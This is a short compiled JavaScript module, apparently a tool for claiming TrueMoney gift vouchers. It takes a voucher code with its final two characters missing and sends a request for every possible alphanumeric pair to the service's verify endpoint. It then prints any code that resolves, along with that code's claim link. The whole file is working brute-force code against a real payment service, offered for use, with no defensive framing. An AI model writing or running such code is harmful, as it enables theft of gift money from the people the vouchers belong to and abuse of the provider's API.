"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
var needle_1 = __importDefault(require("needle"));
var IGNORING_CASES = ['VOUCHER_NOT_FOUND', 'INTERNAL_ERROR'];
var POSSIBLE_ALPHABETS = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'
];
var LINK = {
    CAMPAIGN_PREFIX: 'https://gift.truemoney.com/campaign/?v=',
    GENERATE_TRIAL_VERIFY_LINK: function (midfix) { return "https://gift.truemoney.com/campaign/vouchers/" + midfix + "/verify"; }
};
var RUN = function (TARGET_MISSING_CODE) {
    //if(!process.argv[2]) return console.log('[USAGE]: twinties.ts eCccjeab61o3Nngd')
    //const TARGET_MISSING_CODE:string = process.argv[2] // should be the one with missing last alphabet
    console.time('pair_perf');
    for (var _i = 0, POSSIBLE_ALPHABETS_1 = POSSIBLE_ALPHABETS; _i < POSSIBLE_ALPHABETS_1.length; _i++) {
        var alphabet = POSSIBLE_ALPHABETS_1[_i];
        var _loop_1 = function (pair_alphabet) {
            var paired_alphabet = pair_alphabet + alphabet;
            needle_1.default.get(LINK.GENERATE_TRIAL_VERIFY_LINK(TARGET_MISSING_CODE + paired_alphabet), function (error, response) {
                if (IGNORING_CASES.indexOf(response.body.status.code) === -1) {
                    return console.log("actual_code: " + (TARGET_MISSING_CODE + paired_alphabet) + "\nfull_link: " + LINK.CAMPAIGN_PREFIX + (TARGET_MISSING_CODE + paired_alphabet)); // in ur console -> see magic ^_^
                }
            });
        };
        for (var _a = 0, POSSIBLE_ALPHABETS_2 = POSSIBLE_ALPHABETS; _a < POSSIBLE_ALPHABETS_2.length; _a++) {
            var pair_alphabet = POSSIBLE_ALPHABETS_2[_a];
            _loop_1(pair_alphabet);
        }
    }
    console.timeEnd('pair_perf');
};
exports.default = RUN;
